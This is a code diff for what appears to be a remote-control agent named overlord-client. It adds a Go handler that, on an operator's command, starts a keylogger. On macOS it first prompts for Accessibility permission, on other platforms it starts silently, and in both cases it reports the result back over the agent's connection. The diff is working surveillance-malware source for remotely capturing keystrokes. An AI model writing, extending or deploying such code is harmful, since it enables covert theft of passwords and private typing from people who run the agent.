@@ -9,6 +9,77 @@ import (
 	"overlord-client/cmd/agent/wire"
 )
 
+// HandleKeylogRequestPermission handles the keylog_request_permission command.
+// On macOS it triggers the Accessibility permission prompt and reports back
+// whether permission was granted.  On other platforms it reports that no
+// permission gate exists and the keylogger is already running (or starts it).
+func HandleKeylogRequestPermission(ctx context.Context, env *runtime.Env, cmdID string) error {
+	if env.Keylogger == nil {
+		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
+			"type":      "keylog_permission_result",
+			"commandId": cmdID,
+			"granted":   false,
+			"reason":    "keylogger_disabled",
+		})
+	}
+
+	if !env.Keylogger.NeedsPermissionGate() {
+		// Non-macOS: keylogger doesn't need an explicit permission gate.
+		// Ensure it is running (it should already be) and report granted.
+		if !env.Keylogger.IsRunning() {
+			if err := env.Keylogger.Start(); err != nil {
+				log.Printf("[keylogger] start error: %v", err)
+				return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
+					"type":      "keylog_permission_result",
+					"commandId": cmdID,
+					"granted":   false,
+					"reason":    err.Error(),
+				})
+			}
+		}
+		return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
+			"type":      "keylog_permission_result",
+			"commandId": cmdID,
+			"granted":   true,
+			"reason":    "no_permission_gate",
+		})
+	}
+
+	// macOS: trigger the OS accessibility prompt and wait for the result.
+	log.Printf("[keylogger] macOS: requesting accessibility permission")
+	granted := env.Keylogger.RequestPermission()
+
+	if granted {
+		// Start the keylogger now that we have permission.
+		if !env.Keylogger.IsRunning() {
+			if err := env.Keylogger.Start(); err != nil {
+				log.Printf("[keylogger] start after permission grant failed: %v", err)
+				return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
+					"type":      "keylog_permission_result",
+					"commandId": cmdID,
+					"granted":   false,
+					"reason":    "start_failed: " + err.Error(),
+				})
+			}
+		}
+		log.Printf("[keylogger] macOS accessibility permission granted, keylogger started")
+	} else {
+		log.Printf("[keylogger] macOS accessibility permission denied")
+	}
+
+	reason := "granted"
+	if !granted {
+		reason = "user_denied"
+	}
+
+	return wire.WriteMsg(ctx, env.Conn, map[string]interface{}{
+		"type":      "keylog_permission_result",
+		"commandId": cmdID,
+		"granted":   granted,
+		"reason":    reason,
+	})
+}
+
 const MaxChunkSize = 256 * 1024
 
 func HandleKeylogList(ctx context.Context, env *runtime.Env, cmdID string) error {
